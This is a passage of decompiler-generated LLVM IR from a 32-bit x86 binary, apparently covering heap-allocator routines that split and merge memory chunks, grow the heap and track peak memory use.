dec_label_pc_80515f6:                             ; preds = %dec_label_pc_80515d9, %dec_label_pc_80515c8, %dec_label_pc_80515af, %dec_label_pc_805159e, %dec_label_pc_80515ea
  %v0_80515f9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515f9 = add i32 %v0_80515f9, 8
  store i32 %v1_80515f9, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051600 = call i32 @function_8051983(i32 %tmp6)
  br label %dec_label_pc_8051726

dec_label_pc_805160a:                             ; preds = %dec_label_pc_80514cb, %dec_label_pc_8051581, %dec_label_pc_805154f
  %v1_805161b = phi i32 [ %v1_80514bb, %dec_label_pc_80514cb ], [ %v2_8051588, %dec_label_pc_8051581 ], [ %v0_805160a.pre, %dec_label_pc_805154f ]
  %v5_805160c = sub i32 %v1_805161b, %.v1_80514a8
  store i32 %v5_805160c, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_805160c, 16
  br i1 %tmp24, label %dec_label_pc_8051615, label %dec_label_pc_8051627

dec_label_pc_8051615:                             ; preds = %dec_label_pc_805160a
  %v0_8051615 = load i32, i32* @edi, align 4
  %v1_8051615 = add i32 %v0_8051615, 4
  %v2_8051615 = inttoptr i32 %v1_8051615 to i32*
  %v3_8051615 = load i32, i32* %v2_8051615, align 4
  %v1_8051618 = urem i32 %v3_8051615, 2
  %v2_805161b = or i32 %v1_8051618, %v1_805161b
  store i32 %v2_805161b, i32* %eax.global-to-local, align 4
  store i32 %v2_805161b, i32* %v2_8051615, align 4
  %v0_8051620 = load i32, i32* @edi, align 4
  %v1_8051620 = load i32, i32* @ebx, align 4
  %v2_8051620 = add i32 %v0_8051620, 4
  %v3_8051620 = add i32 %v2_8051620, %v1_8051620
  %v4_8051620 = inttoptr i32 %v3_8051620 to i32*
  %v5_8051620 = load i32, i32* %v4_8051620, align 4
  %v6_8051620 = or i32 %v5_8051620, 1
  store i32 %v6_8051620, i32* %v4_8051620, align 4
  br label %dec_label_pc_8051657

dec_label_pc_8051627:                             ; preds = %dec_label_pc_805160a
  %v0_805162b = load i32, i32* @edi, align 4
  %v2_805162b = add i32 %v0_805162b, %.v1_80514a8
  store i32 %v2_805162b, i32* %eax.global-to-local, align 4
  %v1_805162e = add i32 %v0_805162b, 4
  %v2_805162e = inttoptr i32 %v1_805162e to i32*
  %v3_805162e = load i32, i32* %v2_805162e, align 4
  %v1_8051631 = urem i32 %v3_805162e, 2
  %v5_8051634 = or i32 %v1_8051631, %.v1_80514a8
  store i32 %v5_8051634, i32* %v2_805162e, align 4
  %v0_805163e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051640 = or i32 %v0_805163e, 1
  store i32 %v1_8051640, i32* @edx, align 4
  %v1_8051643 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051643 = add i32 %v1_8051643, 4
  %v3_8051643 = inttoptr i32 %v2_8051643 to i32*
  store i32 %v1_8051640, i32* %v3_8051643, align 4
  %v0_8051646 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051646 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051646 = add i32 %v0_8051646, 4
  %v3_8051646 = add i32 %v2_8051646, %v1_8051646
  %v4_8051646 = inttoptr i32 %v3_8051646 to i32*
  %v5_8051646 = load i32, i32* %v4_8051646, align 4
  %v6_8051646 = or i32 %v5_8051646, 1
  store i32 %v6_8051646, i32* %v4_8051646, align 4
  %v0_805164b = load i32, i32* %eax.global-to-local, align 4
  %v1_805164b = add i32 %v0_805164b, 8
  store i32 %v1_805164b, i32* %eax.global-to-local, align 4
  store i32 %v1_805164b, i32* %stack_var_-60, align 4
  %v1_805164f = call i32 @function_8051983(i32 %v1_805164b)
  store i32 %v1_805164f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051657

dec_label_pc_8051657:                             ; preds = %dec_label_pc_8051615, %dec_label_pc_8051627
  %v0_8051657 = load i32, i32* @edi, align 4
  %v1_8051657 = add i32 %v0_8051657, 8
  store i32 %v1_8051657, i32* @ebx, align 4
  br label %dec_label_pc_8051733

dec_label_pc_805165f:                             ; preds = %dec_label_pc_8051498
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8051663 = load i32, i32* @global_var_805493c.39, align 4
  %v1_8051668 = add i32 %v0_8051663, -1
  store i32 %v1_8051668, i32* %eax.global-to-local, align 4
  %v2_805166d = inttoptr i32 %v1_80514b3 to i32*
  %v3_805166d = load i32, i32* %v2_805166d, align 4
  store i32 %v3_805166d, i32* @ebp, align 4
  %v1_8051670 = or i32 %.v1_80514a8, 4
  store i32 %v1_8051670, i32* %stack_var_-44, align 4
  %v2_8051676 = add i32 %v3_805166d, %v1_8051668
  store i32 %v2_8051676, i32* @edx, align 4
  %v1_8051679 = sub i32 0, %v0_8051663
  store i32 %v1_8051679, i32* %eax.global-to-local, align 4
  %v2_805167b = add i32 %v2_8051676, %v1_8051670
  %v2_805167e = and i32 %v2_805167b, %v1_8051679
  store i32 %v2_805167e, i32* @esi, align 4
  %v2_8051682 = sub i32 %v2_805167e, %v3_805166d
  store i32 %v2_8051682, i32* @ebx, align 4
  %v15_8051684 = icmp eq i32 %v1_80514bb, %v2_8051682
  br i1 %v15_8051684, label %dec_label_pc_805172f, label %dec_label_pc_805168e

dec_label_pc_805168e:                             ; preds = %dec_label_pc_805165f
  %v2_8051695 = sub i32 %v1_80514b3, %v3_805166d
  store i32 %v2_8051695, i32* @edi, align 4
  %v2_8051697 = add i32 %v3_805166d, %v1_80514bb
  store i32 %v2_8051697, i32* %eax.global-to-local, align 4
  store i32 %v2_8051695, i32* %stack_var_-60, align 4
  %v6_805169b = inttoptr i32 %v2_8051695 to i32*
  %v7_805169b = call i32 @function_805280e(i32* %v6_805169b, i32 %v2_8051697, i32 %v2_805167e, i32 1, i32 %v1_8051670, i32 %v1_80514bb)
  store i32 %v7_805169b, i32* %eax.global-to-local, align 4
  %v10_80516a3 = icmp eq i32 %v7_805169b, -1
  br i1 %v10_80516a3, label %dec_label_pc_80516e7, label %dec_label_pc_80516a8

dec_label_pc_80516a8:                             ; preds = %dec_label_pc_805168e
  %v1_80516a8 = load i32, i32* @ebp, align 4
  %v2_80516a8 = add i32 %v1_80516a8, %v7_805169b
  store i32 %v2_80516a8, i32* @edx, align 4
  %v0_80516ab = load i32, i32* @ebx, align 4
  %v1_80516ab = or i32 %v0_80516ab, 2
  store i32 %v1_80516ab, i32* %ebx.global-to-local, align 4
  %v0_80516ae = load i32, i32* @esi, align 4
  store i32 %v0_80516ae, i32* %eax.global-to-local, align 4
  %v2_80516b0 = add i32 %v2_80516a8, 4
  %v3_80516b0 = inttoptr i32 %v2_80516b0 to i32*
  store i32 %v1_80516ab, i32* %v3_80516b0, align 4
  %v0_80516b3 = load i32, i32* %eax.global-to-local, align 4
  %v5_80516b3 = sub i32 %v0_80516b3, %v1_80514bb
  %v1_80516b7 = load i32, i32* @global_var_8054944.44, align 4
  %v2_80516b7 = add i32 %v1_80516b7, %v5_80516b3
  store i32 %v2_80516b7, i32* %eax.global-to-local, align 4
  store i32 %v2_80516b7, i32* @global_var_8054944.44, align 4
  %v1_80516c2 = load i32, i32* @global_var_8054950.45, align 16
  %tmp25 = icmp ugt i32 %v2_80516b7, %v1_80516c2
  br i1 %tmp25, label %dec_label_pc_80516ca, label %dec_label_pc_80516cf

dec_label_pc_80516ca:                             ; preds = %dec_label_pc_80516a8
  store i32 %v2_80516b7, i32* @global_var_8054950.45, align 16
  br label %dec_label_pc_80516cf

dec_label_pc_80516cf:                             ; preds = %dec_label_pc_80516a8, %dec_label_pc_80516ca
  %v1_80516cf = load i32, i32* @global_var_8054948.46, align 8
  %v2_80516cf = add i32 %v1_80516cf, %v2_80516b7
  store i32 %v2_80516cf, i32* %eax.global-to-local, align 4
  %v1_80516d5 = load i32, i32* @global_var_8054954.47, align 4
  %tmp26 = icmp ugt i32 %v2_80516cf, %v1_80516d5
  br i1 %tmp26, label %dec_label_pc_80516dd, label %dec_label_pc_80516e2

dec_label_pc_80516dd:                             ; preds = %dec_label_pc_80516cf
  store i32 %v2_80516cf, i32* @global_var_8054954.47, align 4
  br label %dec_label_pc_80516e2

dec_label_pc_80516e2:                             ; preds = %dec_label_pc_80516cf, %dec_label_pc_80516dd
  %v0_80516e2 = load i32, i32* @edx, align 4
  %v1_80516e2 = add i32 %v0_80516e2, 8
  store i32 %v1_80516e2, i32* @ebx, align 4
  br label %dec_label_pc_8051733

dec_label_pc_80516e7:                             ; preds = %dec_label_pc_805168e
  %v2_80516e7 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80516e7, i32* %eax.global-to-local, align 4
  %v10_80516ea = icmp ult i32 %v1_80514bb, %v2_80516e7
  %v1_80516ee = icmp eq i1 %v10_80516ea, false
  br i1 %v1_80516ee, label %dec_label_pc_805172f, label %dec_label_pc_80516f0

dec_label_pc_80516f0:                             ; preds = %dec_label_pc_80516e7
  %v1_80516f7 = add i32 %.v1_80514a8, -7
  store i32 %v1_80516f7, i32* %eax.global-to-local, align 4
  store i32 %v1_80516f7, i32* %stack_var_-60, align 4
  %v1_80516fb = call i32 @function_8050bbe(i32 %v1_80516f7)
  store i32 %v1_80516fb, i32* %eax.global-to-local, align 4
  store i32 %v1_80516fb, i32* @ebx, align 4
  %v1_8051705 = icmp eq i32 %v1_80516fb, 0
  br i1 %v1_8051705, label %dec_label_pc_805172b, label %dec_label_pc_8051709

dec_label_pc_8051709:                             ; preds = %dec_label_pc_80516f0
  %v1_805170e = add i32 %v1_80514bb, -8
  store i32 %v1_805170e, i32* %eax.global-to-local, align 4
  store i32 %v1_80516fb, i32* %stack_var_-60, align 4
  %v3_8051717 = inttoptr i32 %v1_80516fb to i16*
  %v4_8051717 = call i32 @function_80529aa(i16* %v3_8051717, i32 %tmp6, i32 %v1_805170e)
  store i32 %v4_8051717, i32* %eax.global-to-local, align 4
  store i32 %v1_80516fb, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051721 = call i32 @function_8051983(i32 %tmp6)
  br label %dec_label_pc_8051726

dec_label_pc_8051726:                             ; preds = %dec_label_pc_80515f6, %dec_label_pc_8051709
  %storemerge = phi i32 [ %v1_8051721, %dec_label_pc_8051709 ], [ %v1_8051600, %dec_label_pc_80515f6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051733

dec_label_pc_805172b:                             ; preds = %dec_label_pc_80516f0, %dec_label_pc_805155a
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051733

dec_label_pc_805172f:                             ; preds = %dec_label_pc_80516e7, %dec_label_pc_805165f, %dec_label_pc_80514f9
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8051733

dec_label_pc_8051733:                             ; preds = %dec_label_pc_805172b, %dec_label_pc_8051726, %dec_label_pc_80516e2, %dec_label_pc_8051657, %dec_label_pc_805172f
  store i32 %v2_8051468, i32* @eax, align 4
  store i32 %v2_8051468, i32* %stack_var_-60, align 4
  %v2_805173c = call i32 @function_80520ea(i32 %v2_8051468, i32 1)
  store i32 %v2_805173c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051741

dec_label_pc_8051741:                             ; preds = %dec_label_pc_805144c, %dec_label_pc_8051438, %dec_label_pc_8051733
  br label %dec_label_pc_8051744

dec_label_pc_8051744:                             ; preds = %dec_label_pc_8051486, %dec_label_pc_8051741
  %v0_8051747 = load i32, i32* @ebx, align 4
  store i32 %v0_8051747, i32* %eax.global-to-local, align 4
  store i32 %v0_8051429, i32* @ebx, align 4
  store i32 %v0_8051428, i32* @esi, align 4
  store i32 %v0_8051427, i32* @edi, align 4
  store i32 %v0_8051426, i32* @ebp, align 4
  ret i32 %v0_8051747

; uselistorder directives
  uselistorder i32 %v1_80516fb, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_80516cf, { 1, 0, 2 }
  uselistorder i32 %v2_80516b7, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8051695, { 1, 0, 2 }
  uselistorder i32 %v1_8051670, { 1, 0, 2 }
  uselistorder i32 %v3_805166d, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805162b, { 1, 0 }
  uselistorder i32 %v1_8051591, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8051565, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8051509, { 1, 0, 2 }
  uselistorder i32 %v3_805151c, { 0, 2, 1 }
  uselistorder i32 %v2_80514d9, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80514bb, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_80514b3, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_80514a8, { 4, 12, 0, 1, 7, 8, 9, 2, 11, 3, 10, 5, 6 }
  uselistorder i32 %v1_8051498, { 0, 2, 1 }
  uselistorder i32 %v0_8051481, { 1, 0 }
  uselistorder i32 %v2_8051468, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_8051983, { 7, 6, 5, 4, 3, 10, 9, 8, 1, 0, 11, 2 }
  uselistorder i32 (i32)* @function_8050bbe, { 4, 3, 2, 0, 1, 5 }
  uselistorder label %dec_label_pc_8051744, { 1, 0 }
  uselistorder label %dec_label_pc_8051741, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051733, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051726, { 1, 0 }
  uselistorder label %dec_label_pc_80516e2, { 1, 0 }
  uselistorder label %dec_label_pc_80516cf, { 1, 0 }
  uselistorder label %dec_label_pc_8051657, { 1, 0 }
  uselistorder label %dec_label_pc_805160a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80515f6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805154f, { 1, 0 }
}

define i32 @function_805174e() local_unnamed_addr {
dec_label_pc_805174e:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8051755 = load i32, i32* @edx, align 4
  store i32 %v0_8051755, i32* %ebp.global-to-local, align 4
  %v1_8051757 = add i32 %v0_8051755, 860
  %v2_8051757 = inttoptr i32 %v1_8051757 to i32*
  %v3_8051757 = load i32, i32* %v2_8051757, align 4
  store i32 %v3_8051757, i32* %ecx.global-to-local, align 4
  %v1_805175d = add i32 %v0_8051755, 44
  %v2_805175d = inttoptr i32 %v1_805175d to i32*
  %v3_805175d = load i32, i32* %v2_805175d, align 4
  %v1_8051760 = add i32 %v3_805175d, 4
  %v2_8051760 = inttoptr i32 %v1_8051760 to i32*
  %v3_8051760 = load i32, i32* %v2_8051760, align 4
  %v1_8051763 = and i32 %v3_8051760, -4
  store i32 %v1_8051763, i32* @esi, align 4
  %v1_8051768 = load i32, i32* @eax, align 4
  %v2_8051768 = add i32 %v3_8051757, -17
  %v2_805176a = add i32 %v2_8051768, %v1_8051763
  %v3_805176a = sub i32 %v2_805176a, %v1_8051768
  %div = udiv i32 %v3_805176a, %v3_8051757
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_805176a, %v3_8051757
  store i32 %tmp10, i32* @edx, align 4
  %v1_8051772 = add i32 %div, -1
  %v4_8051775 = mul i32 %v1_8051772, %v3_8051757
  store i32 %v4_8051775, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8051775, 1
  br i1 %tmp11, label %dec_label_pc_80517d3, label %dec_label_pc_805177c

dec_label_pc_805177c:                             ; preds = %dec_label_pc_805174e
  %v1_8051781 = call i32 @function_80528b1(i32 0)
  store i32 %v1_8051781, i32* %edi.global-to-local, align 4
  %v0_8051788 = load i32, i32* @esi, align 4
  store i32 %v0_8051788, i32* %eax.global-to-local, align 4
  %v1_805178a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805178a = add i32 %v1_805178a, 44
  %v3_805178a = inttoptr i32 %v2_805178a to i32*
  %v4_805178a = load i32, i32* %v3_805178a, align 4
  %v5_805178a = add i32 %v4_805178a, %v0_8051788
  store i32 %v5_805178a, i32* %eax.global-to-local, align 4
  %v12_8051790 = icmp eq i32 %v1_8051781, %v5_805178a
  %v1_8051792 = icmp eq i1 %v12_8051790, false
  br i1 %v1_8051792, label %dec_label_pc_80517d3, label %dec_label_pc_8051794

dec_label_pc_8051794:                             ; preds = %dec_label_pc_805177c
  %v1_8051797 = sub i32 0, %v4_8051775
  store i32 %v1_8051797, i32* @ebx, align 4
  %v1_805179a = call i32 @function_80528b1(i32 %v1_8051797)
  store i32 %v1_805179a, i32* %eax.global-to-local, align 4
  %v1_80517a6 = call i32 @function_80528b1(i32 0)
  store i32 %v1_80517a6, i32* %eax.global-to-local, align 4
  %v10_80517ae = icmp eq i32 %v1_80517a6, -1
  br i1 %v10_80517ae, label %dec_label_pc_80517d3, label %dec_label_pc_80517b3

dec_label_pc_80517b3:                             ; preds = %dec_label_pc_8051794
  %v0_80517b3 = load i32, i32* %edi.global-to-local, align 4
  %v2_80517b5 = sub i32 %v0_80517b3, %v1_80517a6
  %v12_80517b5 = icmp eq i32 %v2_80517b5, 0
  store i32 %v2_80517b5, i32* %ecx.global-to-local, align 4
  br i1 %v12_80517b5, label %dec_label_pc_80517d3, label %dec_label_pc_80517b9

dec_label_pc_80517b9:                             ; preds = %dec_label_pc_80517b3
  %v0_80517b9 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80517b9 = add i32 %v0_80517b9, 44
  %v2_80517b9 = inttoptr i32 %v1_80517b9 to i32*
  %v3_80517b9 = load i32, i32* %v2_80517b9, align 4
  store i32 %v3_80517b9, i32* %eax.global-to-local, align 4
  %v1_80517bc = add i32 %v0_80517b9, 872
  %v2_80517bc = inttoptr i32 %v1_80517bc to i32*
  %v3_80517bc = load i32, i32* %v2_80517bc, align 4
  %v5_80517bc = sub i32 %v3_80517bc, %v2_80517b5
  store i32 %v5_80517bc, i32* %v2_80517bc, align 4
  %v0_80517c2 = load i32, i32* @esi, align 4
  %v1_80517c2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80517c2 = sub i32 %v0_80517c2, %v1_80517c2
  %v1_80517c4 = or i32 %v2_80517c2, 1
  %v1_80517c7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80517c7 = add i32 %v1_80517c7, 4
  %v3_80517c7 = inttoptr i32 %v2_80517c7 to i32*
  store i32 %v1_80517c4, i32* %v3_80517c7, align 4
  br label %dec_label_pc_80517d3

dec_label_pc_80517d3:                             ; preds = %dec_label_pc_805174e, %dec_label_pc_805177c, %dec_label_pc_8051794, %dec_label_pc_80517b3, %dec_label_pc_80517b9
  %storemerge = phi i32 [ 1, %dec_label_pc_80517b9 ], [ 0, %dec_label_pc_80517b3 ], [ 0, %dec_label_pc_8051794 ], [ 0, %dec_label_pc_805177c ], [ 0, %dec_label_pc_805174e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80517a6, { 1, 0, 2 }
  uselistorder i32 %v4_8051775, { 1, 2, 0 }
  uselistorder i32 %v3_8051757, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_80528b1, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80517d3, { 4, 3, 2, 1, 0 }
}

define i32 @function_80517db(i32* %arg1) local_unnamed_addr {
dec_label_pc_80517db:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80517dc = load i32, i32* @edi, align 4
  %v0_80517dd = load i32, i32* @esi, align 4
  %v0_80517de = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80517e6 = load i32, i32* %arg1, align 4
  store i32 %v2_80517e6, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80517ed = icmp eq i32 %v2_80517e6, 0
  br i1 %v1_80517ed, label %dec_label_pc_8051907.lr.ph, label %dec_label_pc_80517f5

dec_label_pc_8051907.lr.ph:                       ; preds = %dec_label_pc_80517db
  %v3_805190b = add i32 %tmp20, 44
  br label %dec_label_pc_8051907

dec_label_pc_80517f5:                             ; preds = %dec_label_pc_80517db
  %v1_80517f9 = and i32 %v2_80517e6, -3
  store i32 %v1_80517f9, i32* %arg1, align 4
  %v1_80517fe = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_8051809 = add i32 %tmp20, 4
  store i32 %v1_8051809, i32* %eax.global-to-local, align 4
  %v2_8051814 = load i32, i32* %arg1, align 4
  %v2_805181a = udiv i32 %v2_8051814, 8
  %v2_805181d = mul nuw i32 %v2_805181a, 4
  %v3_805181d = add i32 %tmp20, -4
  %v4_805181d = add i32 %v3_805181d, %v2_805181d
  store i32 %v4_805181d, i32* %eax.global-to-local, align 4
  %v2_80518e4 = add i32 %tmp20, 44
  %v3_80518e4 = inttoptr i32 %v2_80518e4 to i32*
  %v1_80518b7 = add i32 %tmp20, 60
  %v2_80518b7 = inttoptr i32 %v1_80518b7 to i32*
  br label %dec_label_pc_8051825

dec_label_pc_8051825:                             ; preds = %dec_label_pc_80518f3, %dec_label_pc_80517f5
  %v0_8051833 = phi i32 [ %v1_8051809, %dec_label_pc_80517f5 ], [ %v4_80518fd, %dec_label_pc_80518f3 ]
  store i32 %v0_8051833, i32* %eax.global-to-local, align 4
  %v1_8051829 = inttoptr i32 %v0_8051833 to i32*
  %v2_8051829 = load i32, i32* %v1_8051829, align 4
  store i32 %v2_8051829, i32* @ecx, align 4
  %v1_805182b = icmp eq i32 %v2_8051829, 0
  br i1 %v1_805182b, label %dec_label_pc_80518f3, label %dec_label_pc_8051833

dec_label_pc_8051833:                             ; preds = %dec_label_pc_8051825
  store i32 0, i32* %v1_8051829, align 4
  %v0_8051839.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051839

dec_label_pc_8051839:                             ; preds = %dec_label_pc_80518e7, %dec_label_pc_8051833
  %v0_8051856 = phi i32 [ %v3_8051839, %dec_label_pc_80518e7 ], [ %v0_8051839.pre, %dec_label_pc_8051833 ]
  %v1_8051839 = add i32 %v0_8051856, 8
  %v2_8051839 = inttoptr i32 %v1_8051839 to i32*
  %v3_8051839 = load i32, i32* %v2_8051839, align 4
  store i32 %v3_8051839, i32* %edx.global-to-local, align 4
  %v1_8051840 = add i32 %v0_8051856, 4
  %v2_8051840 = inttoptr i32 %v1_8051840 to i32*
  %v3_8051840 = load i32, i32* %v2_8051840, align 4
  store i32 %v3_8051840, i32* %eax.global-to-local, align 4
  %v1_8051845 = and i32 %v3_8051840, -2
  store i32 %v1_8051845, i32* @edi, align 4
  %v2_8051848 = urem i32 %v3_8051840, 2
  %v3_8051848 = icmp eq i32 %v2_8051848, 0
  %v2_805184a = add i32 %v1_8051845, %v0_8051856
  store i32 %v2_805184a, i32* @ebx, align 4
  %v1_805184d = add i32 %v2_805184a, 4
  %v2_805184d = inttoptr i32 %v1_805184d to i32*
  %v3_805184d = load i32, i32* %v2_805184d, align 4
  store i32 %v3_805184d, i32* %edx.global-to-local, align 4
  %v1_8051854 = icmp eq i1 %v3_8051848, false
  br i1 %v1_8051854, label %dec_label_pc_8051876, label %dec_label_pc_8051856

dec_label_pc_8051856:                             ; preds = %dec_label_pc_8051839
  %v1_8051856 = inttoptr i32 %v0_8051856 to i32*
  %v2_8051856 = load i32, i32* %v1_8051856, align 4
  store i32 %v2_8051856, i32* %ebp.global-to-local, align 4
  %v2_805185a = sub i32 %v0_8051856, %v2_8051856
  store i32 %v2_805185a, i32* %eax.global-to-local, align 4
  %v1_805185c = add i32 %v2_805185a, 8
  %v2_805185c = inttoptr i32 %v1_805185c to i32*
  %v3_805185c = load i32, i32* %v2_805185c, align 4
  store i32 %v3_805185c, i32* @esi, align 4
  %v1_805185f = add i32 %v2_805185a, 12
  %v2_805185f = inttoptr i32 %v1_805185f to i32*
  %v3_805185f = load i32, i32* %v2_805185f, align 4
  store i32 %v3_805185f, i32* %edx.global-to-local, align 4
  %v1_8051862 = add i32 %v3_805185c, 12
  %v2_8051862 = inttoptr i32 %v1_8051862 to i32*
  %v3_8051862 = load i32, i32* %v2_8051862, align 4
  store i32 %v3_8051862, i32* @ecx, align 4
  %v12_8051865 = icmp eq i32 %v3_8051862, %v2_805185a
  %v1_8051867 = icmp eq i1 %v12_8051865, false
  br i1 %v1_8051867, label %dec_label_pc_80518a6, label %dec_label_pc_8051869

dec_label_pc_8051869:                             ; preds = %dec_label_pc_8051856
  %v1_8051869 = add i32 %v3_805185f, 8
  %v2_8051869 = inttoptr i32 %v1_8051869 to i32*
  %v3_8051869 = load i32, i32* %v2_8051869, align 4
  %v15_8051869 = icmp eq i32 %v3_8051869, %v3_8051862
  %v1_805186c = icmp eq i1 %v15_8051869, false
  br i1 %v1_805186c, label %dec_label_pc_80518a6, label %dec_label_pc_805186e

dec_label_pc_805186e:                             ; preds = %dec_label_pc_8051869
  %v2_805186e = add i32 %v2_8051856, %v1_8051845
  store i32 %v2_805186e, i32* @edi, align 4
  store i32 %v3_805185f, i32* %v2_8051862, align 4
  %v0_8051873 = load i32, i32* @esi, align 4
  %v1_8051873 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051873 = add i32 %v1_8051873, 8
  %v3_8051873 = inttoptr i32 %v2_8051873 to i32*
  store i32 %v0_8051873, i32* %v3_8051873, align 4
  %v0_8051881.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051876

dec_label_pc_8051876:                             ; preds = %dec_label_pc_8051839, %dec_label_pc_805186e
  %v1_805188a = phi i32 [ %v2_805184a, %dec_label_pc_8051839 ], [ %v0_8051881.pre, %dec_label_pc_805186e ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805187e = and i32 %v3_805184d, -4
  store i32 %v1_805187e, i32* %ebp.global-to-local, align 4
  %v4_8051881 = load i32, i32* %v3_80518e4, align 4
  %v15_8051881 = icmp eq i32 %v1_805188a, %v4_8051881
  br i1 %v15_8051881, label %dec_label_pc_80518d7, label %dec_label_pc_8051886

dec_label_pc_8051886:                             ; preds = %dec_label_pc_8051876
  %v2_8051886 = add i32 %v1_805188a, 4
  %v3_8051886 = add i32 %v2_8051886, %v1_805187e
  %v4_8051886 = inttoptr i32 %v3_8051886 to i32*
  %v5_8051886 = load i32, i32* %v4_8051886, align 4
  store i32 %v5_8051886, i32* %eax.global-to-local, align 4
  %v3_805188a = inttoptr i32 %v2_8051886 to i32*
  store i32 %v1_805187e, i32* %v3_805188a, align 4
  %v0_805188d = load i32, i32* %eax.global-to-local, align 4
  %v1_805188d = urem i32 %v0_805188d, 2
  %v2_805188d = icmp eq i32 %v1_805188d, 0
  store i32 %v1_805188d, i32* %eax.global-to-local, align 4
  %v1_8051892 = icmp eq i1 %v2_805188d, false
  br i1 %v1_8051892, label %dec_label_pc_80518b3, label %dec_label_pc_8051894

dec_label_pc_8051894:                             ; preds = %dec_label_pc_8051886
  %v0_8051894 = load i32, i32* @ebx, align 4
  %v1_8051894 = add i32 %v0_8051894, 8
  %v2_8051894 = inttoptr i32 %v1_8051894 to i32*
  %v3_8051894 = load i32, i32* %v2_8051894, align 4
  store i32 %v3_8051894, i32* @edx, align 4
  %v1_8051897 = add i32 %v0_8051894, 12
  %v2_8051897 = inttoptr i32 %v1_8051897 to i32*
  %v3_8051897 = load i32, i32* %v2_8051897, align 4
  store i32 %v3_8051897, i32* %eax.global-to-local, align 4
  %v1_805189a = add i32 %v3_8051894, 12
  %v2_805189a = inttoptr i32 %v1_805189a to i32*
  %v3_805189a = load i32, i32* %v2_805189a, align 4
  store i32 %v3_805189a, i32* @esi, align 4
  %v12_805189d = icmp eq i32 %v3_805189a, %v0_8051894
  %v1_805189f = icmp eq i1 %v12_805189d, false
  br i1 %v1_805189f, label %dec_label_pc_80518a6, label %dec_label_pc_80518a1

dec_label_pc_80518a1:                             ; preds = %dec_label_pc_8051894
  %v1_80518a1 = add i32 %v3_8051897, 8
  %v2_80518a1 = inttoptr i32 %v1_80518a1 to i32*
  %v3_80518a1 = load i32, i32* %v2_80518a1, align 4
  %v15_80518a1 = icmp eq i32 %v3_80518a1, %v3_805189a
  br i1 %v15_80518a1, label %dec_label_pc_80518ab, label %dec_label_pc_80518a6

dec_label_pc_80518a6:                             ; preds = %dec_label_pc_80518a1, %dec_label_pc_8051894, %dec_label_pc_8051869, %dec_label_pc_8051856
  %v0_80518a6 = call i32 @function_8051b1f()
  store i32 %v0_80518a6, i32* %eax.global-to-local, align 4
  %v1_80518ad.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80518ab

